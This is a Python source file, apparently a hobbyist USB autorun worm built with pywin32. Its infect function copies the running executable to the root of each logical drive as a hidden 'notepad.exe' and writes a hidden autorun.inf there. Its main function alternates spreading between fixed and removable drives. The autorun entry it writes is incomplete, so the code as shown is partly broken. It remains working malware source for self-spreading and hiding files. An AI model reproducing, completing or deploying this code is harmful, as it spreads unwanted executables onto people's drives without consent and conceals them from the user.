import win32file
import win32con
import win32api

'''
win32file.CreateFile()
win32file.DeleteFile()
win32file.ReadFile()
win32file.WriteFile()
win32file.FlushFileBuffers()
win32file.SetFilePointer()
win32api.GetLogicalDriveStrings
win32file.GetDriveType()
win32file.CreateDirectory()
win32file.RemoveDirectory()
'''


#win32file.CreateFile('copy2.txt',win32con.GENERIC_WRITE | win32con.GENERIC_READ,0 ,None,win32con.CREATE_ALWAYS,win32con.FILE_ATTRIBUTE_NORMAL,0)

szAutoRun = r'[AutoRun] \r'

def infect(fileName, uDriveType):
    szDriveString = '0'*1024
    dwRet = 0
    iNum = 0
    szRoot = '0'*4
    uType = 0
    szTarget = '0'*256
    szDriveString = win32api.GetLogicalDriveStrings()
    dwRet = len(szDriveString)
    
    while(iNum<dwRet):
        szRoot = szDriveString[iNum:iNum+3]
        #uType = win32file.GetDriveType(szRoot)
        
        '''if uType == uDriveType:
            szTarget = szRoot
            szTarget += 'notepad.exe'
            print 'fileName=',fileName,',szTarget=',szTarget
            try:
                win32file.CopyFile(fileName, szTarget, False)
                win32file.SetFileAttributes(szTarget, win32con.FILE_ATTRIBUTE_HIDDEN)
                szTarget = szRoot
                szTarget += 'autorun.inf'
                hFile = win32file.CreateFile(szTarget,win32con.GENERIC_WRITE | win32con.GENERIC_READ,0 ,None,win32con.CREATE_ALWAYS,win32con.FILE_ATTRIBUTE_NORMAL,0)
                dwWritten = 0
                win32file.WriteFile(hFile, szAutoRun, 0)
                win32file.CloseHandle(hFile)
                win32file.SetFileAttributes(szTarget, win32con.FILE_ATTRIBUTE_HIDDEN)
            except Exception as e:
                print e
        '''
        szTarget = szRoot
        szTarget += 'notepad.exe'
        #print 'fileName=',fileName,',szTarget=',szTarget
        try:
            win32file.CopyFile(fileName, szTarget, False)
            win32file.SetFileAttributes(szTarget, win32con.FILE_ATTRIBUTE_HIDDEN)
            szTarget = szRoot
            szTarget += 'autorun.inf'
            hFile = win32file.CreateFile(szTarget,win32con.GENERIC_WRITE | win32con.GENERIC_READ,0 ,None,win32con.CREATE_ALWAYS,win32con.FILE_ATTRIBUTE_NORMAL,0)
            dwWritten = 0
            win32file.WriteFile(hFile, szAutoRun, None)
            win32file.CloseHandle(hFile)
            win32file.SetFileAttributes(szTarget, win32con.FILE_ATTRIBUTE_HIDDEN)
        except Exception as e:
            pass

        iNum += 4
    return

def main():
    szFileName = '0'*1024
    szRoot = '0'*4
    uType = 0
    szFileName = win32api.GetModuleFileName(None)
    szRoot = szFileName[0:3]

    uType = win32file.GetDriveType(szRoot)

    if uType == win32con.DRIVE_FIXED:
        infect(szFileName, win32con.DRIVE_REMOVABLE)
        #infect(szFileName, win32con.DRIVE_FIXED)
    elif uType == win32con.DRIVE_REMOVABLE:
        #infect(szFileName, win32con.DRIVE_REMOVABLE)
        infect(szFileName, win32con.DRIVE_FIXED)

    return


if __name__=='__main__':
    main()
